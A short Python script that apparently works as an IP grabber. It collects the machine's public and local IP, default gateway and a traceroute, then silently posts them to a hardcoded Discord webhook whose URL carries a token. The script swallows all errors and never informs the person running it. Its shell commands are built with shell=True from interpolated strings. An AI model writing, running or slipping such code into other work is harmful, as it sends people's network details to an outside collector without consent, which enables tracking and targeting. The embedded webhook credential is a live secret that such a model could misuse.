import requests
import socket
import subprocess
import platform

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=text', timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except:
        return 'Unable to fetch public IP'
    return 'Unable to fetch public IP'

def get_local_ip():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return local_ip
    except:
        return 'Unable to fetch local IP'

def get_default_gateway():
    system = platform.system()
    try:
        if system == 'Windows':
            output = subprocess.check_output("ipconfig", shell=True).decode()
            for line in output.splitlines():
                if 'Default Gateway' in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        gateway = parts[1].strip()
                        if gateway:
                            return gateway
        else:
            # For Linux / macOS
            output = subprocess.check_output("ip route show default", shell=True).decode()
            for line in output.splitlines():
                if 'default' in line:
                    parts = line.split()
                    gateway_index = parts.index('via') + 1
                    return parts[gateway_index]
    except:
        return 'Unable to fetch default gateway'
    return 'Unable to fetch default gateway'

def trace_route(destination):
    system = platform.system()
    try:
        if system == 'Windows':
            command = f"tracert -h 30 {destination}"
        else:
            command = f"traceroute -m 30 {destination}"
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode()
        return output
    except:
        return 'Trace route failed'

def send_to_webhook(data, webhook_url):
    try:
        requests.post(webhook_url, json=data)
    except:
        pass

def main():
    webhook_url = 'https://discord.com/api/webhooks/1397185556118634636/fYxi0tlwBM3vbmZUe66OrY0J-kKeL2oAMArqyW5l20KbVa1ivnmLIxwGeik2cTrbJsN2'  # Replace with your webhook URL

    public_ip = get_public_ip()
    local_ip = get_local_ip()
    default_gateway = get_default_gateway()
    trace = trace_route(public_ip)

    data = {
        'public_ip': public_ip,
        'local_ip': local_ip,
        'default_gateway': default_gateway,
        'trace': trace
    }

    send_to_webhook(data, webhook_url)

if __name__ == "__main__":
    main()
